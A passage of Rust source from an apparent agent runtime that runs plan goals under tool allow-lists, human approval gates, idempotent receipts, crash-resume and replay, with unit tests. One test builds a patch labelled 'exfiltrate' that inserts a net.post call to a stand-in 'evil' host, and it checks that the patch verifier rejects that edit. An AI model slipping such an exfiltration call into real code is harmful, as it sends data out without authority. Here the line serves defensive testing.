    /// Receipts already on disk when this walk began (from prior processes).
    baseline_receipts: u64,
    /// Loop-body iterations this walk (bounded by `PLAN_LOOP_LIMIT`).
    loop_iters: u64,
    /// The approval gate currently authorizing execution, if the walk is inside a
    /// granted `approve { … }` body. Recorded on the receipt of any gated effect so
    /// a receipt names the approval that permitted it. Saved/restored across nested
    /// gates.
    current_gate_id: Option<String>,
    crash: Option<ActionCrash>,
}

impl PlanCtx<'_> {
    /// Persist the cosmetic head. Counters are derived from the durable receipt
    /// count + the process-local commit count, never the other way round.
    fn save(&mut self) -> io::Result<()> {
        let total = (self.baseline_receipts + self.committed_this_process) as usize;
        self.state.receipts_created = total;
        self.state.actions_executed = total;
        self.state.cursor = self.call_index;
        // `step` tracks cumulative durable side effects (one per receipt) so the
        // crash message and `from_step` report real progress, not a stuck 0.
        self.state.step = total as u64;
        store::save_state(self.repo, &self.state)
    }

    fn bump_loop(&mut self) -> Option<Flow> {
        self.loop_iters += 1;
        if self.loop_iters > PLAN_LOOP_LIMIT {
            Some(Flow::Failed(format!(
                "plan exceeded the loop safety limit of {PLAN_LOOP_LIMIT} iterations"
            )))
        } else {
            None
        }
    }
}

/// The result of executing a `call`: the tool's (possibly memoized) output, or a
/// halt that must unwind the walk (budget/authority/tool error/crash).
enum CallOutcome {
    Output(Value),
    Halt(Flow),
}

fn exec_stmts(ctx: &mut PlanCtx, stmts: &[PlanStmt]) -> io::Result<Flow> {
    for s in stmts {
        match exec_stmt(ctx, s)? {
            Flow::Next => {}
            other => return Ok(other),
        }
    }
    Ok(Flow::Next)
}

fn exec_stmt(ctx: &mut PlanCtx, s: &PlanStmt) -> io::Result<Flow> {
    match s {
        PlanStmt::Let { name, value, .. } => {
            let v = match value {
                PlanValue::Call(c) => match exec_call(ctx, c)? {
                    CallOutcome::Output(v) => v,
                    CallOutcome::Halt(f) => return Ok(f),
                },
                PlanValue::Expr(e) => match plan::eval_expr(e, &ctx.env) {
                    Ok(v) => v,
                    Err(msg) => return Ok(Flow::Failed(msg)),
                },
            };
            ctx.env.insert(name.clone(), v);
            Ok(Flow::Next)
        }
        PlanStmt::Call { call, .. } => match exec_call(ctx, call)? {
            CallOutcome::Output(_) => Ok(Flow::Next),
            CallOutcome::Halt(f) => Ok(f),
        },
        PlanStmt::Approve { summary, body, .. } => exec_approve(ctx, summary, body),
        PlanStmt::If {
            cond, then, els, ..
        } => {
            let take = match plan::eval_expr(cond, &ctx.env).and_then(|v| plan::as_bool(&v)) {
                Ok(b) => b,
                Err(msg) => return Ok(Flow::Failed(msg)),
            };
            if take {
                exec_stmts(ctx, then)
            } else if let Some(els) = els {
                exec_stmts(ctx, els)
            } else {
                Ok(Flow::Next)
            }
        }
        PlanStmt::For {
            var, iter, body, ..
        } => {
            let items = match plan::eval_expr(iter, &ctx.env) {
                Ok(Value::Array(a)) => a,
                Ok(other) => {
                    return Ok(Flow::Failed(format!(
                        "`for` expects a list, found a {} value",
                        json_type_name(&other)
                    )))
                }
                Err(msg) => return Ok(Flow::Failed(msg)),
            };
            for item in items {
                if let Some(f) = ctx.bump_loop() {
                    return Ok(f);
                }
                ctx.env.insert(var.clone(), item);
                match exec_stmts(ctx, body)? {
                    Flow::Next => {}
                    other => return Ok(other),
                }
            }
            Ok(Flow::Next)
        }
        PlanStmt::While { cond, body, .. } => loop {
            let keep = match plan::eval_expr(cond, &ctx.env).and_then(|v| plan::as_bool(&v)) {
                Ok(b) => b,
                Err(msg) => return Ok(Flow::Failed(msg)),
            };
            if !keep {
                return Ok(Flow::Next);
            }
            if let Some(f) = ctx.bump_loop() {
                return Ok(f);
            }
            match exec_stmts(ctx, body)? {
                Flow::Next => {}
                other => return Ok(other),
            }
        },
    }
}

fn exec_call(ctx: &mut PlanCtx, c: &PlanCall) -> io::Result<CallOutcome> {
    // 1. Evaluate the input record.
    let mut input = serde_json::Map::new();
    for (k, e) in &c.input {
        match plan::eval_expr(e, &ctx.env) {
            Ok(v) => {
                input.insert(k.clone(), v);
            }
            Err(msg) => {
                return Ok(CallOutcome::Halt(Flow::Failed(format!(
                    "call `{}` input `{}`: {}",
                    c.tool, k, msg
                ))))
            }
        }
    }
    let input = Value::Object(input);

    // 2. Budget bills tool calls reached this walk.
    ctx.call_index += 1;
    if ctx.call_index > ctx.spec.step_budget() {
        return Ok(CallOutcome::Halt(Flow::Budget));
    }
    let action_id = format!("c{}", ctx.call_index - 1);

    // 3. Authority FIRST — a plan can only ever call what `allow` grants.
    if !ctx.spec.allowed_tools().contains(&c.tool) {
        return Ok(CallOutcome::Halt(Flow::Failed(format!(
            "tool `{}` is outside the goal's authority",
            c.tool
        ))));
    }

    // 4. Memoize: a receipt for this key means the effect already happened, so
    //    return the recorded output WITHOUT invoking the tool again — silently
    //    (no events), which keeps a resume's log free of duplicate tool.called.
    let key = store::idempotency_key(&ctx.run_id, &action_id, &c.tool, &input);
    if let Some(existing) = store::find_receipt_by_key(ctx.repo, &ctx.run_id, &key)? {
        return Ok(CallOutcome::Output(existing.output));
    }

    // 5. Invoke. The (atomic) receipt write is the commit point; the events are
    //    emitted only AFTER it is durable, so every tool.called in the log has a
    //    receipt and a crash between commit and event-emit costs only an event.
    match action::invoke_fake_tool(&c.tool, &input) {
        Ok(output) => {
            let rid = store::receipt_id(&key);
            // The receipt is written BEFORE its events, so it can't read back the
            // `receipt.created` id — precompute it. The events emitted just below are,
            // in order, tool.called, tool.completed, receipt.created, so the third one
            // (peek_seq + 2) is the receipt's recording event.
            let created_event_id = format!("evt_{:06}", ctx.log.peek_seq() + 2);
            let receipt = Receipt {
                receipt_id: rid.clone(),
                idempotency_key: key.clone(),
                action_id: action_id.clone(),
                tool: c.tool.clone(),
                input: input.clone(),
                output: output.clone(),
                run_id: ctx.run_id.clone(),
                // One receipt commits per durable side effect; this is the step it
                // lands at. Computed explicitly because `ctx.save()` (which advances
                // `state.step`) hasn't run yet and `committed_this_process` is bumped
                // just after this.
                step: ctx.baseline_receipts + ctx.committed_this_process + 1,
                effect: c.tool.clone(),
                input_hash: store::input_hash(&input),
                approval_id: ctx.current_gate_id.clone(),
                created_event_id,
            };
            store::save_receipt(ctx.repo, &ctx.run_id, &receipt)?; // <- COMMIT POINT
            ctx.committed_this_process += 1;
            ctx.log.append(
                kind::TOOL_CALLED,
                json!({ "tool": c.tool, "action": action_id, "idempotency_key": key, "input": input }),
            )?;
            ctx.log.append(
                kind::TOOL_COMPLETED,
                json!({ "tool": c.tool, "action": action_id, "output": output }),
            )?;
            ctx.log.append(
                kind::RECEIPT_CREATED,
                json!({ "receipt_id": rid, "tool": c.tool, "action": action_id, "idempotency_key": key }),
            )?;
            ctx.state.status = "running".into();
            ctx.state.pending_approval = None;
            ctx.save()?;
            if crash_after_n(ctx.crash, ctx.committed_this_process) {
                return Ok(CallOutcome::Halt(Flow::Crash));
            }
            Ok(CallOutcome::Output(output))
        }
        Err(e) => {
            ctx.log.append(
                kind::TOOL_FAILED,
                json!({ "tool": c.tool, "action": action_id, "error": e }),
            )?;
            Ok(CallOutcome::Halt(Flow::Failed(format!(
                "tool `{}` failed: {}",
                c.tool, e
            ))))
        }
    }
}

fn exec_approve(ctx: &mut PlanCtx, summary: &str, body: &[PlanStmt]) -> io::Result<Flow> {
    let action_id = format!("gate{}", ctx.gate_index);
    ctx.gate_index += 1;
    let gate_id = store::approval_id(&ctx.run_id, &action_id);
    let status = store::load_approval(ctx.repo, &ctx.run_id, &gate_id)
        .ok()
        .map(|a| a.status);
    match status.as_deref() {
        None => {
            // First reach: propose + request, then PAUSE. The body does NOT run;
            // re-entry on resume sees the pending file and pauses again.
            let tool = first_call_tool(body).unwrap_or("plan.gate").to_string();
            let approval = Approval {
                id: gate_id.clone(),
                action_id: action_id.clone(),
                tool: tool.clone(),
                summary: summary.to_string(),
                status: "pending".into(),
                note: None,
            };
            store::save_approval(ctx.repo, &ctx.run_id, &approval)?;
            ctx.log.append(
                kind::ACTION_PROPOSED,
                json!({ "approval_id": gate_id, "gate": action_id, "summary": summary, "tool": tool }),
            )?;
            ctx.log.append(
                kind::APPROVAL_REQUESTED,
                json!({ "approval_id": gate_id, "gate": action_id, "summary": summary }),
            )?;
            ctx.state.status = "awaiting_approval".into();
            ctx.state.pending_approval = Some(gate_id);
            ctx.save()?;
            Ok(Flow::Pause)
        }
        Some("pending") => {
            ctx.state.status = "awaiting_approval".into();
            ctx.state.pending_approval = Some(gate_id);
            ctx.save()?;
            Ok(Flow::Pause)
        }
        Some("denied") => {
            ctx.log.append(
                kind::ACTION_SKIPPED,
                json!({ "approval_id": gate_id, "gate": action_id, "reason": "approval denied" }),
            )?;
            Ok(Flow::Denied(gate_id))
        }
        // "granted" (or any other resolved status) → run the gated body. The gate
        // authorizes every effect inside it, so record it on those receipts;
        // save/restore the prior gate to keep nested approvals correct.
        _ => {
            let prev = ctx.current_gate_id.replace(gate_id);
            let flow = exec_stmts(ctx, body);
            ctx.current_gate_id = prev;
            flow
        }
    }
}

/// The durable plan loop: one full re-execution of the plan, persisting receipts
/// and approvals as it goes and finalizing the run from the walk's outcome.
fn drive_plan(
    repo: &Path,
    spec: &GoalSpec,
    plan_block: &PlanBlock,
    state: RunState,
    log: &mut EventLog,
    crash: Option<ActionCrash>,
) -> io::Result<RunResult> {
    let run_id = state.run_id.clone();
    let baseline = store::list_receipts(repo, &run_id).len() as u64;
    let mut ctx = PlanCtx {
        repo,
        run_id,
        spec,
        log,
        state,
        env: Env::new(),
        call_index: 0,
        gate_index: 0,
        committed_this_process: 0,
        baseline_receipts: baseline,
        loop_iters: 0,
        current_gate_id: None,
        crash,
    };

    let flow = exec_stmts(&mut ctx, &plan_block.stmts)?;
    let receipts = (ctx.baseline_receipts + ctx.committed_this_process) as usize;

    match flow {
        Flow::Next => {
            ctx.state.status = "completed".into();
            ctx.state.pending_approval = None;
            ctx.log.append(
                kind::RUN_COMPLETED,
                json!({ "kind": "plan", "receipts": receipts, "calls": ctx.call_index }),
            )?;
            ctx.save()?;
            Ok(action_result(ctx.state, false, false))
        }
        Flow::Pause => {
            // exec_approve already saved the awaiting_approval head.
            Ok(action_result(ctx.state, false, true))
        }
        Flow::Denied(id) => {
            ctx.state.status = "denied".into();
            ctx.state.pending_approval = None;
            ctx.log.append(
                kind::RUN_FAILED,
                json!({ "reason": "approval denied", "approval_id": id }),
            )?;
            ctx.save()?;
            Ok(action_result(ctx.state, false, false))
        }
        Flow::Failed(reason) => {
            ctx.state.status = "failed".into();
            ctx.state.pending_approval = None;
            ctx.log
                .append(kind::RUN_FAILED, json!({ "reason": reason }))?;
            ctx.save()?;
            Ok(action_result(ctx.state, false, false))
        }
        Flow::Budget => {
            ctx.state.status = "budget_exhausted".into();
            ctx.log.append(
                kind::BUDGET_EXHAUSTED,
                json!({ "calls": ctx.call_index, "limit": spec.step_budget() }),
            )?;
            ctx.save()?;
            Ok(action_result(ctx.state, false, false))
        }
        Flow::Crash => {
            // The receipt is durable and the head was saved at the crash point;
            // leave the status as-is — the run is resumable.
            Ok(action_result(ctx.state, true, false))
        }
    }
}

fn new_plan_state(run_id: &str, goal: &str) -> RunState {
    RunState {
        run_id: run_id.to_string(),
        goal: goal.to_string(),
        status: "running".into(),
        step: 0,
        consecutive_rejections: 0,
        patches_applied: 0,
        patches_rejected: 0,
        tests_run: 0,
        regressions: 0,
        diff_chars: 0,
        final_errors: 0,
        tests_passed: 0,
        tests_failed: 0,
        kind: "plan".into(),
        cursor: 0,
        pending_approval: None,
        actions_executed: 0,
        receipts_created: 0,
        ..Default::default()
    }
}

/// Start a brand-new plan run. `base_files` is the source snapshot the run is
/// pinned to: empty for a built-in goal (the plan is re-derived from the catalog),
/// or the authoring workspace for a user-written plan goal (resume/replay re-parse
/// this frozen snapshot, never the live tree). See [`resolve_plan`].
pub fn start_plan_run(
    repo: &Path,
    spec: GoalSpec,
    plan_block: PlanBlock,
    base_files: BTreeMap<String, String>,
    crash: Option<ActionCrash>,
) -> io::Result<RunResult> {
    let fingerprint = store::fingerprint(&spec.name, &base_files);
    let run_id = store::allocate_run(repo, &fingerprint)?;
    let record = GoalRecord {
        spec: spec.clone(),
        strategy: "plan".into(),
        base_files,
        kind: "plan".into(),
    };
    store::save_goal(repo, &run_id, &record)?;

    let mut log = EventLog::create(&events_path(repo, &run_id), &run_id)?;
    log.append(
        kind::RUN_STARTED,
        json!({
            "goal": spec.name,
            "kind": "plan",
            "budget": { "steps": spec.step_budget() },
            "tools": spec.allow.tools,
        }),
    )?;

    let state = new_plan_state(&run_id, &spec.name);
    store::save_state(repo, &state)?;
    drive_plan(repo, &spec, &plan_block, state, &mut log, crash)
}

/// The plan a run executes, re-obtained for resume/replay. A user-authored plan
/// goal snapshots its source into `base_files` at run start, so we re-parse that
/// **frozen snapshot** — never the live working tree — which is what makes editing
/// the source mid-run unable to change an in-flight run. A built-in goal has no
/// snapshot (empty `base_files`); its plan is re-derived from the catalog, which is
/// part of the binary's identity. Either way the result is identical to the plan
/// the run started with, so the walk-order ordinals that key idempotency re-derive
/// the same and exactly-once holds.
fn resolve_plan(record: &GoalRecord) -> io::Result<PlanBlock> {
    let name = &record.spec.name;
    if !record.base_files.is_empty() {
        let sources: Vec<crate::source::SourceFile> = record
            .base_files
            .iter()
            .map(|(p, t)| crate::source::SourceFile::new(p.clone(), t.clone()))
            .collect();
        let (prog, _) = crate::program::Program::parse_sources(sources);
        let decl = crate::goal::find_goal(&prog, name).ok_or_else(|| {
            io::Error::new(
                io::ErrorKind::NotFound,
                format!("goal `{name}` is not in the run's source snapshot"),
            )
        })?;
        return decl.plan.clone().ok_or_else(|| {
            io::Error::new(
                io::ErrorKind::InvalidData,
                format!("goal `{name}` in the run's snapshot has no plan block"),
            )
        });
    }
    plan::builtin_plan_goal(name)
        .map(|(_, p)| p)
        .ok_or_else(|| {
            io::Error::new(
                io::ErrorKind::NotFound,
                format!("no built-in plan goal `{name}` to resolve"),
            )
        })
}

/// Resume a plan run. The plan is re-obtained via [`resolve_plan`] (snapshot or
/// catalog) and the walk recomputes everything from the receipts/ and approvals/
/// dirs. `state.json` is read only for the cosmetic `from_step` in the resume event.
pub fn resume_plan_run(
    repo: &Path,
    run_id: &str,
    crash: Option<ActionCrash>,
) -> io::Result<RunResult> {
    let record = store::load_goal(repo, run_id)?;
    let plan_block = resolve_plan(&record)?;
    resume_plan_with(repo, run_id, record.spec, plan_block, crash)
}

/// Resume against an already-resolved spec + plan. The catalog path re-derives
/// these by goal name; this is the seam that does the durable work once they are
/// in hand (also how tests drive synthetic, non-catalog plans).
fn resume_plan_with(
    repo: &Path,
    run_id: &str,
    spec: GoalSpec,
    plan_block: PlanBlock,
    crash: Option<ActionCrash>,
) -> io::Result<RunResult> {
    let state = store::load_state(repo, run_id)?;
    let mut log = EventLog::resume(&events_path(repo, run_id), run_id)?;
    log.append(
        kind::RUN_RESUMED,
        json!({ "kind": "plan", "from_step": state.step }),
    )?;
    drive_plan(repo, &spec, &plan_block, state, &mut log, crash)
}

// ----- plan replay (pure re-simulation) -----
//
// Replay re-walks the plan with no persistence and no crash, reading the recorded
// approvals as the run's human inputs and re-invoking the deterministic fake
// tools. It proves reproducibility by comparing the simulated terminal status and
// receipt set (idempotency key -> output) to the recorded ones — NOT the event
// sequence, which legitimately differs between a straight and a crashed+resumed
// run. The walk mirrors the durable one but is read-only; both share the same
// expression semantics, key formulas, and fake tools, so they cannot diverge in
// what they decide.

struct ReplayCtx<'a> {
    repo: &'a Path,
    run_id: &'a str,
    spec: &'a GoalSpec,
    env: Env,
    call_index: u64,
    gate_index: u64,
    loop_iters: u64,
    receipts: BTreeMap<String, Value>,
}

fn replay_stmts(ctx: &mut ReplayCtx, stmts: &[PlanStmt]) -> Flow {
    for s in stmts {
        match replay_stmt(ctx, s) {
            Flow::Next => {}
            other => return other,
        }
    }
    Flow::Next
}

fn replay_stmt(ctx: &mut ReplayCtx, s: &PlanStmt) -> Flow {
    match s {
        PlanStmt::Let { name, value, .. } => {
            let v = match value {
                PlanValue::Call(c) => match replay_call(ctx, c) {
                    Ok(v) => v,
                    Err(f) => return f,
                },
                PlanValue::Expr(e) => match plan::eval_expr(e, &ctx.env) {
                    Ok(v) => v,
                    Err(msg) => return Flow::Failed(msg),
                },
            };
            ctx.env.insert(name.clone(), v);
            Flow::Next
        }
        PlanStmt::Call { call, .. } => match replay_call(ctx, call) {
            Ok(_) => Flow::Next,
            Err(f) => f,
        },
        PlanStmt::Approve { body, .. } => {
            let action_id = format!("gate{}", ctx.gate_index);
            ctx.gate_index += 1;
            let gate_id = store::approval_id(ctx.run_id, &action_id);
            match store::load_approval(ctx.repo, ctx.run_id, &gate_id)
                .ok()
                .map(|a| a.status)
                .as_deref()
            {
                Some("granted") => replay_stmts(ctx, body),
                Some("denied") => Flow::Denied(gate_id),
                _ => Flow::Pause,
            }
        }
        PlanStmt::If {
            cond, then, els, ..
        } => match plan::eval_expr(cond, &ctx.env).and_then(|v| plan::as_bool(&v)) {
            Ok(true) => replay_stmts(ctx, then),
            Ok(false) => els
                .as_deref()
                .map(|e| replay_stmts(ctx, e))
                .unwrap_or(Flow::Next),
            Err(msg) => Flow::Failed(msg),
        },
        PlanStmt::For {
            var, iter, body, ..
        } => {
            let items = match plan::eval_expr(iter, &ctx.env) {
                Ok(Value::Array(a)) => a,
                Ok(other) => {
                    return Flow::Failed(format!(
                        "`for` expects a list, found a {} value",
                        json_type_name(&other)
                    ))
                }
                Err(msg) => return Flow::Failed(msg),
            };
            for item in items {
                ctx.loop_iters += 1;
                if ctx.loop_iters > PLAN_LOOP_LIMIT {
                    return Flow::Failed("plan exceeded the loop safety limit".into());
                }
                ctx.env.insert(var.clone(), item);
                match replay_stmts(ctx, body) {
                    Flow::Next => {}
                    other => return other,
                }
            }
            Flow::Next
        }
        PlanStmt::While { cond, body, .. } => loop {
            match plan::eval_expr(cond, &ctx.env).and_then(|v| plan::as_bool(&v)) {
                Ok(true) => {}
                Ok(false) => return Flow::Next,
                Err(msg) => return Flow::Failed(msg),
            }
            ctx.loop_iters += 1;
            if ctx.loop_iters > PLAN_LOOP_LIMIT {
                return Flow::Failed("plan exceeded the loop safety limit".into());
            }
            match replay_stmts(ctx, body) {
                Flow::Next => {}
                other => return other,
            }
        },
    }
}

fn replay_call(ctx: &mut ReplayCtx, c: &PlanCall) -> Result<Value, Flow> {
    let mut input = serde_json::Map::new();
    for (k, e) in &c.input {
        match plan::eval_expr(e, &ctx.env) {
            Ok(v) => {
                input.insert(k.clone(), v);
            }
            Err(msg) => return Err(Flow::Failed(msg)),
        }
    }
    let input = Value::Object(input);
    ctx.call_index += 1;
    if ctx.call_index > ctx.spec.step_budget() {
        return Err(Flow::Budget);
    }
    let action_id = format!("c{}", ctx.call_index - 1);
    if !ctx.spec.allowed_tools().contains(&c.tool) {
        return Err(Flow::Failed(format!(
            "tool `{}` is outside the goal's authority",
            c.tool
        )));
    }
    let key = store::idempotency_key(ctx.run_id, &action_id, &c.tool, &input);
    match action::invoke_fake_tool(&c.tool, &input) {
        Ok(out) => {
            ctx.receipts.insert(key, out.clone());
            Ok(out)
        }
        Err(e) => Err(Flow::Failed(format!("tool `{}` failed: {}", c.tool, e))),
    }
}

pub fn replay_plan_run(repo: &Path, run_id: &str) -> io::Result<ReplayResult> {
    let record = store::load_goal(repo, run_id)?;
    let plan_block = resolve_plan(&record)?;
    let spec = record.spec;
    let recorded = store::load_state(repo, run_id)?;
    let recorded_receipts: BTreeMap<String, Value> = store::list_receipts(repo, run_id)
        .into_iter()
        .map(|r| (r.idempotency_key, r.output))
        .collect();

    let mut ctx = ReplayCtx {
        repo,
        run_id,
        spec: &spec,
        env: Env::new(),
        call_index: 0,
        gate_index: 0,
        loop_iters: 0,
        receipts: BTreeMap::new(),
    };
    let status = match replay_stmts(&mut ctx, &plan_block.stmts) {
        Flow::Next => "completed",
        Flow::Pause => "awaiting_approval",
        Flow::Denied(_) => "denied",
        Flow::Failed(_) => "failed",
        Flow::Budget => "budget_exhausted",
        Flow::Crash => "running",
    }
    .to_string();

    let identical = status == recorded.status && ctx.receipts == recorded_receipts;
    Ok(ReplayResult {
        recorded_status: recorded.status,
        replayed_status: status,
        identical,
        steps: ctx.call_index,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::event::read_all;
    use crate::goal;
    use crate::program::Program;
    use crate::project::{DEMO_AUTH, DEMO_GOAL, DEMO_TEST};
    use crate::source::SourceFile;
    use std::path::PathBuf;
    use std::sync::atomic::{AtomicU64, Ordering};

    /// A throwaway repo directory, removed when the test ends.
    struct TempRepo(PathBuf);

    impl TempRepo {
        fn new(tag: &str) -> Self {
            static N: AtomicU64 = AtomicU64::new(0);
            let n = N.fetch_add(1, Ordering::Relaxed);
            let dir =
                std::env::temp_dir().join(format!("tach_rt_{}_{}_{}", std::process::id(), tag, n));
            let _ = std::fs::remove_dir_all(&dir);
            std::fs::create_dir_all(&dir).unwrap();
            TempRepo(dir)
        }
        fn path(&self) -> &Path {
            &self.0
        }
    }

    impl Drop for TempRepo {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.0);
        }
    }

    /// The demo's broken auth project plus its goal, as a base workspace + spec.
    fn demo() -> (GoalSpec, Workspace) {
        let (prog, diags) = Program::parse_sources(vec![SourceFile::new("goal.tach", DEMO_GOAL)]);
        assert!(
            diags.iter().all(|d| !d.is_error()),
            "goal must parse: {:?}",
            diags
        );
        let decl = goal::find_goal(&prog, "FixFailingTests").expect("demo goal");
        let spec = GoalSpec::from_decl(decl);
        let mut ws = Workspace::new();
        ws.insert("src/auth.tach", DEMO_AUTH);
        ws.insert("tests/auth_test.tach", DEMO_TEST);
        (spec, ws)
    }

    #[test]
    fn run_reaches_completed_and_writes_history() {
        let repo = TempRepo::new("complete");
        let (spec, ws) = demo();
        let r = start_run(repo.path(), spec, ws, Strategy::Minimal, None).unwrap();
        assert_eq!(r.state.status, "completed", "state: {:?}", r.state.status);
        assert_eq!(r.state.patches_applied, 3);
        assert_eq!(r.state.regressions, 0);
        assert_eq!(r.state.tests_failed, 0);

        // The event log records the whole run, terminated by run.completed.
        let events = read_all(&store::events_path(repo.path(), &r.state.run_id)).unwrap();
        assert!(events.iter().any(|e| e.kind == kind::RUN_STARTED));
        assert_eq!(
            events
                .iter()
                .filter(|e| e.kind == kind::PATCH_APPLIED)
                .count(),
            3
        );
        assert_eq!(events.last().unwrap().kind, kind::RUN_COMPLETED);
        // Sequence numbers are contiguous from 1.
        for (i, e) in events.iter().enumerate() {
            assert_eq!(e.seq, i as u64 + 1);
            assert_eq!(e.schema, crate::event::EVENT_SCHEMA);
        }
    }

    #[test]
    fn crash_then_resume_does_not_duplicate_work() {
        let repo = TempRepo::new("resume");
        let (spec, ws) = demo();

        // Crash after the 2nd step. The run is durable but not finalized.
        let crashed = start_run(repo.path(), spec, ws, Strategy::Minimal, Some(2)).unwrap();
        assert!(crashed.crashed);
        assert_eq!(crashed.state.status, "running");
        assert_eq!(crashed.state.step, 2);
        assert_eq!(crashed.state.patches_applied, 2);
        let run_id = crashed.state.run_id.clone();

        // Resume picks up from the checkpoint and finishes.
        let resumed = resume_run(repo.path(), &run_id, None).unwrap();
        assert_eq!(resumed.state.status, "completed");
        // The total applied across the whole run is exactly 3 — the third patch
        // was applied once, on resume; the first two were NOT repeated.
        assert_eq!(
            resumed.state.patches_applied, 3,
            "resume must not duplicate patches"
        );

        // Exactly three patch.applied events exist across the entire history.
        let events = read_all(&store::events_path(repo.path(), &run_id)).unwrap();
        assert_eq!(
            events
                .iter()
                .filter(|e| e.kind == kind::PATCH_APPLIED)
                .count(),
            3,
            "history must show three applied patches, not more"
        );
        assert!(events.iter().any(|e| e.kind == kind::RUN_RESUMED));

        // The resumed run is byte-identical to an uninterrupted one.
        let repo2 = TempRepo::new("straight");
        let (spec2, ws2) = demo();
        let straight = start_run(repo2.path(), spec2, ws2, Strategy::Minimal, None).unwrap();
        assert_eq!(resumed.final_files, straight.final_files);
    }

    #[test]
    fn replay_reproduces_a_completed_run() {
        let repo = TempRepo::new("replay");
        let (spec, ws) = demo();
        let r = start_run(repo.path(), spec, ws, Strategy::Minimal, None).unwrap();
        let replay = replay_run(repo.path(), &r.state.run_id, false).unwrap();
        assert!(
            replay.identical,
            "replay diverged: {:?} vs {:?}",
            replay.recorded_status, replay.replayed_status
        );
        assert_eq!(replay.replayed_status, "completed");
    }

    #[test]
    fn fingerprint_is_deterministic_offline() {
        let (_, ws) = demo();
        let a = store::fingerprint("FixFailingTests", &ws.files);
        let b = store::fingerprint("FixFailingTests", &ws.files);
        assert_eq!(a, b);
        assert!(a.starts_with("run_"));
        // A different goal name yields a different fingerprint.
        assert_ne!(a, store::fingerprint("Other", &ws.files));
    }

    #[test]
    fn repeated_runs_get_distinct_ids_and_never_overwrite_history() {
        // Running the same goal over the same source twice in one store must
        // produce two distinct runs — the second must not truncate the first's
        // history. This is the property a real long-horizon runtime depends on.
        let repo = TempRepo::new("repeat");
        let (spec1, ws1) = demo();
        let first = start_run(repo.path(), spec1, ws1, Strategy::Minimal, None).unwrap();
        let (spec2, ws2) = demo();
        let second = start_run(repo.path(), spec2, ws2, Strategy::Minimal, None).unwrap();

        // The first run keeps the clean fingerprint id; the second is uniquified.
        let fp = store::fingerprint("FixFailingTests", &demo().1.files);
        assert_eq!(first.state.run_id, fp);
        assert_ne!(first.state.run_id, second.state.run_id);
        assert!(second.state.run_id.starts_with(&format!("{}-", fp)));

        // Both histories survive independently, each ending in run.completed.
        for id in [&first.state.run_id, &second.state.run_id] {
            let events = read_all(&store::events_path(repo.path(), id)).unwrap();
            assert_eq!(
                events
                    .iter()
                    .filter(|e| e.kind == kind::PATCH_APPLIED)
                    .count(),
                3,
                "history for {id} is intact"
            );
            assert_eq!(events.last().unwrap().kind, kind::RUN_COMPLETED);
        }

        // The store reports both as runs of the same fingerprint.
        assert_eq!(store::runs_for_fingerprint(repo.path(), &fp).len(), 2);
    }

    #[test]
    fn event_log_create_refuses_to_clobber() {
        // The last line of defense: even handed a path whose history exists,
        // EventLog::create must refuse rather than truncate.
        let repo = TempRepo::new("noclobber");
        let path = repo.path().join("events.jsonl");
        let mut log = EventLog::create(&path, "run_x").unwrap();
        log.append("run.started", serde_json::json!({})).unwrap();
        assert!(EventLog::create(&path, "run_x").is_err());
        // The original line is still there.
        assert_eq!(read_all(&path).unwrap().len(), 1);
    }

    #[test]
    fn out_of_scope_writes_are_rejected_and_the_run_fails() {
        // A goal that may only write tests/** cannot repair bugs that live in
        // src/**: every patch is rejected before it touches the tree.
        let repo = TempRepo::new("scope");
        let (mut spec, ws) = demo();
        spec.allow.fs_write = vec!["tests/**".into()];
        spec.budget.retries = Some(1);
        let r = start_run(repo.path(), spec, ws, Strategy::Minimal, None).unwrap();
        assert_eq!(r.state.status, "failed");
        assert_eq!(r.state.patches_applied, 0);
        assert!(r.state.patches_rejected >= 1);

        let events = read_all(&store::events_path(repo.path(), &r.state.run_id)).unwrap();
        assert!(events.iter().any(|e| e.kind == kind::PATCH_REJECTED));
        assert!(events.iter().all(|e| e.kind != kind::PATCH_APPLIED));
    }

    #[test]
    fn effect_authority_blocks_an_ungranted_effect() {
        // A goal granted no effects must reject any patch that would make the
        // program perform a brand-new effect — even via the deterministic loop.
        // We model the danger directly through the pipeline the runtime uses.
        use crate::patch::{verify_patch, Edit, Patch, VerifyOpts};
        let mut ws = Workspace::new();
        ws.insert("src/m.tach", "fn pure(x: Int) -> Int {\n  return x\n}\n");
        ws.insert(
            "tests/m_test.tach",
            "test \"id\" {\n  ensure pure(2) == 2\n}\n",
        );
        let at = "fn pure(x: Int) -> Int {\n  ".len();
        let patch = Patch {
            name: "sneak-net".into(),
            reason: "exfiltrate".into(),
            touches: vec!["src/**".into()],
            edits: vec![Edit {
                file: "src/m.tach".into(),
                span: crate::span::Span::at(at),
                replacement: "net.post(\"http://evil\", \"x\")\n  ".into(),
            }],
            prove: vec![],
        };
        let opts = VerifyOpts {
            allow_new_effects: false,
            forbid_api_break: false,
            allowed_effects: Some(std::collections::BTreeSet::new()),
            allowed_writes: Some(vec!["src/**".into()]),
        };
        let v = verify_patch(&ws, &patch, &opts);
        assert!(!v.accepted);
        assert!(v
            .rejections
            .iter()
            .any(|r| r.contains("outside the goal's authority")));
    }

    // ====================================================================
    // Action layer
    // ====================================================================

    use crate::action::{self, ActionPlan, PlannedAction};
    use crate::goal::{AllowSpec, BudgetSpec};

    fn resolve_dup() -> (GoalSpec, ActionPlan) {
        action::builtin_action_goal("ResolveDuplicateCharge").expect("catalog entry")
    }

    /// Mirror what `tach goal approve` does: flip the approval file to a terminal
    /// status and append the decision event (the human decision is recorded once,
    /// here, never re-emitted by the driver).
    fn decide(repo: &Path, run_id: &str, action_id: &str, status: &str, kind_const: &str) {
        let apr_id = store::approval_id(run_id, action_id);
        let mut a = store::load_approval(repo, run_id, &apr_id).expect("approval exists");
        a.status = status.into();
        store::save_approval(repo, run_id, &a).unwrap();
        let mut log = EventLog::resume(&store::events_path(repo, run_id), run_id).unwrap();
        log.append(
            kind_const,
            json!({ "approval_id": apr_id, "action": action_id }),
        )
        .unwrap();
    }
    fn approve(repo: &Path, run_id: &str, action_id: &str) {
        decide(repo, run_id, action_id, "granted", kind::APPROVAL_GRANTED);
    }
    fn deny(repo: &Path, run_id: &str, action_id: &str) {
        decide(repo, run_id, action_id, "denied", kind::APPROVAL_DENIED);
    }

    fn count_kind(repo: &Path, run_id: &str, k: &str) -> usize {
        read_all(&store::events_path(repo, run_id))
            .unwrap()
            .iter()
            .filter(|e| e.kind == k)
            .count()
    }
    fn refund_tool_calls(repo: &Path, run_id: &str) -> usize {
        read_all(&store::events_path(repo, run_id))
